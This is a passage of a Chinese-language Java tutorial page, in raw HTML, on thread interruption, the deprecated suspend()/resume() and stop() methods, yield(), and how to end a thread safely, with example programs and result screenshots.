class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">5000</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"current thread name   "</span> <span class="token operator">+</span> Thread<span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"   i = "</span> <span class="token operator">+</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token string">"AA"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        t<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//        t.stop();</span>        t<span class="token punctuation">.</span><span class="token function">interrupt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Thread<span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">interrupt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//        System.out.println("the alive of thread  " + t.isAlive());</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>Thread<span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"  thread 是否终止 "</span> <span class="token operator">+</span> Thread<span class="token punctuation">.</span><span class="token function">interrupted</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>Thread<span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"  thread 是否终止 "</span> <span class="token operator">+</span> Thread<span class="token punctuation">.</span><span class="token function">interrupted</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>t<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"  thread 是否终止 "</span> <span class="token operator">+</span> t<span class="token punctuation">.</span><span class="token function">isInterrupted</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>t<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"  thread 是否终止 "</span> <span class="token operator">+</span> t<span class="token punctuation">.</span><span class="token function">isInterrupted</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>运行结果</strong><br><img src="java%E5%A4%9A%E7%BA%BF%E7%A8%8B%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5.resources/46448EB7-17F0-4A54-8A9E-07C3A9E20D59.png" alt="c1ccfb790494a97b4b5820721ad3d1b5"></p><h3 id="暂停线程"><a href="#暂停线程" class="headerlink" title="暂停线程"></a>暂停线程</h3><p>暂时将线程暂停，暂停线程意味着还可以恢复线程。</p><h4 id="使用suspend-和resume-暂停和恢复线程【过时方法，慎用】"><a href="#使用suspend-和resume-暂停和恢复线程【过时方法，慎用】" class="headerlink" title="使用suspend()和resume()暂停和恢复线程【过时方法，慎用】"></a>使用suspend()和resume()暂停和恢复线程【过时方法，慎用】</h4><p>暂停和恢复线程，两个过时方法。</p><pre class="line-numbers language-java"><code class="language-java"><span class="token comment" spellcheck="true">/** * suspend（挂起，线程不释放资源，容易造成死锁）和resume方法的调用(过时方法) * 缺点 * 独占：使用不当，极易造成公共的同步对象的独占，使其他线程无法访问公共同步对象。 * 不同步：因线程的暂停导致数据不同步 * * @author lwy * @date 2018/12/17 */</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ThreadStopAndRecover</span> <span class="token keyword">extends</span> <span class="token class-name">Thread</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token keyword">long</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">long</span> <span class="token function">getI</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> i<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setI</span><span class="token punctuation">(</span><span class="token keyword">long</span> i<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>i <span class="token operator">=</span> i<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            i<span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> InterruptedException <span class="token punctuation">{</span>        ThreadStopAndRecover t <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ThreadStopAndRecover</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        t<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Thread<span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">5000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//A段</span>        t<span class="token punctuation">.</span><span class="token function">suspend</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"A = "</span> <span class="token operator">+</span> System<span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" i = "</span> <span class="token operator">+</span> t<span class="token punctuation">.</span><span class="token function">getI</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Thread<span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">5000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"A = "</span> <span class="token operator">+</span> System<span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" i = "</span> <span class="token operator">+</span> t<span class="token punctuation">.</span><span class="token function">getI</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//B段</span>        t<span class="token punctuation">.</span><span class="token function">resume</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Thread<span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">5000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//C段</span>        t<span class="token punctuation">.</span><span class="token function">suspend</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"B = "</span> <span class="token operator">+</span> System<span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" i = "</span> <span class="token operator">+</span> t<span class="token punctuation">.</span><span class="token function">getI</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Thread<span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">5000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"B = "</span> <span class="token operator">+</span> System<span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" i = "</span> <span class="token operator">+</span> t<span class="token punctuation">.</span><span class="token function">getI</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行结果<br><img src="java%E5%A4%9A%E7%BA%BF%E7%A8%8B%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5.resources/9815CF74-948F-4620-BB3B-93B94E009B6A.png" alt="28ca7312a8cef5d990c52a7b0adb841a"></p><h4 id="使用suspend-和resume-暂停线程缺点"><a href="#使用suspend-和resume-暂停线程缺点" class="headerlink" title="使用suspend()和resume()暂停线程缺点"></a>使用suspend()和resume()暂停线程缺点</h4><ol><li>造成公共对象的独占，其他线程无法访问公共对象。</li><li>使用suspend和resume容易造成数据不同步的情况。</li></ol><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ThreadStopAndRecover</span> <span class="token keyword">extends</span> <span class="token class-name">Thread</span> <span class="token punctuation">{</span>    <span class="token keyword">synchronized</span> <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">printString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"begin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"A"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"A 线程永远suspend了！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">suspend</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"end"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> InterruptedException <span class="token punctuation">{</span>        ThreadStopAndRecover st <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ThreadStopAndRecover</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token punctuation">{</span>            st<span class="token punctuation">.</span><span class="token function">printString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token string">"A"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token punctuation">{</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"线程2启动了，但进不了printString()方法"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            st<span class="token punctuation">.</span><span class="token function">printString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"因为printString()方法被A线程锁定，并永远suspend暂停了"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行结果<br><img src="java%E5%A4%9A%E7%BA%BF%E7%A8%8B%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5.resources/BD5AFC07-EBC4-49C4-BD31-8D06471F662F.png" alt="ed817c218e4f13df0700a94d9e5438c7"></p><h4 id="使用yield-方法"><a href="#使用yield-方法" class="headerlink" title="使用yield()方法"></a>使用yield()方法</h4><p><strong>简述</strong>：yield()方法是暂时放弃CPU资源，使其回到runnable待运行状态，至于何时重新运行，不受外界控制。取决于CPU。<br><strong>注意</strong>：</p><ol><li><p>yield方法和sleep方法的区别。</p><p>sleep方法是线程暂时休眠，回到阻塞池里面，要等到时间到达或者被唤醒，才会回到待运行状态。<br>yield方法是当前让出cpu资源，回到等待队列里面。下次执行还有可能是自己，</p></li><li><p>使用yield会延长当前线程执行所耗费的时间。</p></li></ol><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ThreadYield</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        Thread t <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token punctuation">{</span>            <span class="token keyword">long</span> beginTime <span class="token operator">=</span> System<span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">int</span> count <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">1000000</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token comment" spellcheck="true">//Thread.yield();</span>                count <span class="token operator">=</span> count <span class="token operator">+</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">long</span> endTime <span class="token operator">=</span> System<span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">" 用时 "</span> <span class="token operator">+</span> <span class="token punctuation">(</span>endTime <span class="token operator">-</span> beginTime<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" 毫秒 "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        t<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当不使用yield方法的时候结果为<br><img src="java%E5%A4%9A%E7%BA%BF%E7%A8%8B%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5.resources/07F79E0F-652E-4719-9637-AF754B591455.png" alt="2f8fa4695931b6ae11cbda1829fa9d8a"><br>当使用yield方法的时候结果为<br><img src="java%E5%A4%9A%E7%BA%BF%E7%A8%8B%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5.resources/CACAAC65-E13A-48AD-93C5-3C529EEFEE55.png" alt="92241fff95199e2d107ea204b60acb55"><br>发现yield()方法将CPU让给其他资源导致速度变慢</p><h2 id="线程的终止"><a href="#线程的终止" class="headerlink" title="线程的终止"></a>线程的终止</h2><p><strong>定义</strong><br>   在线程处理完一个任务之前，停掉当前的工作，也就是放弃当前的操作。</p><p><strong>方法</strong></p><ul><li>线程自然终止：run方法运行完线程自动终止或抛出未处理异常。</li><li>使用退出标志，使线程正常退出。</li><li>使用stop方法强行终止线程。（方法已过时）,虽然这个方法能达到预期效果，但是这个方法是过时的，不安全的，会导致线程资源不能正确释放。最好不要使用</li><li>suspend()、resume()已过时，不建议使用。suspend会导致死锁。</li><li>一般使用interrupt()中断线程。但是要结合条件使用<h3 id="理解中断"><a href="#理解中断" class="headerlink" title="理解中断"></a>理解中断</h3>intertup()方法只是将该线程中断标志设置为true,并不是立即中断该线程。<h3 id="不安全的终止线程"><a href="#不安全的终止线程" class="headerlink" title="不安全的终止线程"></a>不安全的终止线程</h3><h4 id="stop-方法暴力停止-（失效方法）慎用"><a href="#stop-方法暴力停止-（失效方法）慎用" class="headerlink" title="stop()方法暴力停止 （失效方法）慎用"></a>stop()方法暴力停止 （失效方法）慎用</h4></li></ul><p> <strong>注意</strong>：调用stop()方法会抛出ThreadDeath异常。但不需要显示捕获<br>stop()方法已失效，强制让线程停止可能会导致一些清理工作难以完成，对被锁对象进行了解锁，会造成数据不一致问题。</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ThreadStop003</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        Thread t <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token punctuation">{</span>            <span class="token keyword">try</span> <span class="token punctuation">{</span>                <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>                 System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>                    i<span class="token operator">++</span><span class="token punctuation">;</span>                    Thread<span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">stop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">ThreadDeath</span> td<span class="token punctuation">)</span> <span class="token punctuation">{</span>                System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"thread death"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                td<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        t<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行结果<br><img src="java%E5%A4%9A%E7%BA%BF%E7%A8%8B%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5.resources/38EE11E3-D378-4A4B-ADE2-8689DF0F0759.png" alt="aec9cbafa7c1b4c3c8c300466a60bfc7"></p><h4 id="stop-导致的在使用synchronized下不一致问题"><a href="#stop-导致的在使用synchronized下不一致问题" class="headerlink" title="stop()导致的在使用synchronized下不一致问题"></a>stop()导致的在使用synchronized下不一致问题</h4><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">LoginServlet</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> String userNameRef <span class="token operator">=</span> <span class="token string">"C"</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> String passwordRef <span class="token operator">=</span> <span class="token string">"CC"</span><span class="token punctuation">;</span>    <span class="token keyword">synchronized</span> <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">doPost</span><span class="token punctuation">(</span>String userName<span class="token punctuation">,</span> String password<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            userNameRef <span class="token operator">=</span> userName<span class="token punctuation">;</span>            Thread<span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">100000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            passwordRef <span class="token operator">=</span> password<span class="token punctuation">;</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>Thread<span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"  userName =  "</span> <span class="token operator">+</span> userNameRef <span class="token operator">+</span> <span class="token string">"  passwordRef =  "</span> <span class="token operator">+</span> passwordRef<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            Thread t <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token punctuation">{</span>                <span class="token function">doPost</span><span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">,</span> <span class="token string">"aa"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token string">"A"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            t<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Thread<span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            t<span class="token punctuation">.</span><span class="token function">stop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>userNameRef <span class="token operator">+</span> <span class="token string">"--->"</span> <span class="token operator">+</span> passwordRef<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行结果<br><img src="java%E5%A4%9A%E7%BA%BF%E7%A8%8B%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5.resources/028CAC70-27C7-4106-8C7A-286171457710.png" alt="cf1cb35463edb18418792cfd06052a2c"></p><h3 id="如何安全的终止线程"><a href="#如何安全的终止线程" class="headerlink" title="如何安全的终止线程"></a>如何安全的终止线程</h3><p>使用interrupt()方法，但是必须要结合其他方式。</p><h4 id="异常法停止线程"><a href="#异常法停止线程" class="headerlink" title="异常法停止线程"></a>异常法停止线程</h4><ol><li>直接抛出异常。</li><li>先sleep,后interrupt抛出异常。</li></ol><p><strong>注意</strong>：</p><ol><li>抛出interrupt异常之后，会将线程中断位重新置为false。因此要正确的终止线程，要在catch里面重新调用interrupt()方法终止线程</li></ol><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ThreadStop</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        Thread t <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token punctuation">{</span>            <span class="token keyword">try</span> <span class="token punctuation">{</span>                <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">500000</span><span class="token punctuation">;</span> i<span class="token 